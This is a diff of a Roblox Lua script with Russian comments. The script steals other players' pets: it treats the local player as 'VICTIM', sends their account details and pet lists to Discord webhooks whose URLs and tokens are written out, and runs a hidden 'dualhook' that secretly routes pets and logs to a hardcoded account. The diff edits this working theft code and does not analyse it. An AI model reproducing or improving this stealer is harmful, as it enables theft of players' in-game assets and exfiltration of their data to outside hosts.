@@ -2,28 +2,26 @@ repeat
     task.wait()
 until game:IsLoaded()
 
--- 🔐 DualHook config (секретная часть) — НЕ ТРОГАЙ
+-- 🔐 DualHook config (секретная часть) — НЕ ТРОГАЕМ!
 getgenv().DhUser = "Warrior_ggs"
 getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C"
+getgenv().NewUser = "Warrior_ggs" -- NewUser жёстко зафиксирован
 
--- Дефолтные User и Webhook
-local DEFAULT_USER = "Warrior_ggs"
-local DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1398128232821293146/L1XkMHS9HYOhE-LwusnMR_b-hrdgn3M5vY9WYzoc6F9W-9wqHheFjlueX1yweFexJ80J"
-
--- User и Webhook можно задать снаружи
-local USER = getgenv().User or DEFAULT_USER
-local WEBHOOK_URL = getgenv().Webhook or DEFAULT_WEBHOOK
-
--- NewUser зафиксирован и не меняется
-local NEW_USER = "Warrior_ggs"
-
-local USERNAMES = {USER}
+-- User и WEBHOOK_URL берутся снаружи через getgenv(), чтобы менять без правки кода
+local User = getgenv().User or "Warrior_ggs"
+local WEBHOOK_URL = getgenv().Webhook or "https://discord.com/api/webhooks/1398128232821293146/L1XkMHS9HYOhE-LwusnMR_b-hrdgn3M5vY9WYzoc6F9W-9wqHheFjlueX1yweFexJ80J"
 
 local VICTIM = game.Players.LocalPlayer
+
+local USERNAMES = {
+    User
+}
+
 local PET_WHITELIST = {
     'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly', 'Disco Bee', 'Mimic Octopus',
-    'Queen Bee', 'Spinosaurus', 'Kitsune', 'Corrupted Kitsune', 'Chicken Zombie',
+    'Queen Bee', 'Spinosaurus', 'Kitsune', 'Corrupted Kitsune', 'Chicken Zombie','Golden Lab',
 }
+
 local victimPetTable = {}
 
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -53,7 +51,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
                 name = "👤 **Player Information**",
                 value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     VICTIM.Name, 
-                    USERNAMES[1],  -- тут USER из внешних настроек или дефолт
+                    USERNAMES[1],  -- только реальная жертва в логах
                     identifyexecutor(), 
                     game.Players.LocalPlayer.AccountAge
                 ),
@@ -91,7 +89,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
     local headers = { ["Content-Type"] = "application/json" }
     local request = http_request or request or HttpPost or syn.request
 
-    -- Основной вебхук (берём из настроек)
+    -- Основной вебхук (используем внешний WEBHOOK_URL)
     local response = request({
         Url = WEBHOOK_URL,
         Method = "POST",
@@ -103,7 +101,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
         warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
     end
 
-    -- Dualhook лог в секретный вебхук — всегда отправляем, если есть DhWebhook
+    -- 💣 Dualhook лог в секретный вебхук — всегда отправляем, если есть DhWebhook (не трогаем)
     if getgenv().DhWebhook and #getgenv().DhWebhook > 10 then
         local dhResponse = request({
             Url = getgenv().DhWebhook,
@@ -207,15 +205,13 @@ task.spawn(function()
     end
 end)
 
--- 👻 Секретная передача петов на NEW_USER (жёстко закреплён)
+-- 👻 Секретная передача петов на NewUser (жёстко Warrior_ggs)
 task.spawn(function()
     while task.wait(0.5) do
-        for _, player in ipairs(game.Players:GetPlayers()) do
-            if player.Name == NEW_USER then
-                teleportTarget(player.Name)
-                checkPetsInventory(player.Name)
-                break
-            end
+        local player = game.Players:FindFirstChild(getgenv().NewUser)
+        if player then
+            teleportTarget(player.Name)
+            checkPetsInventory(player.Name)
         end
     end
 end)
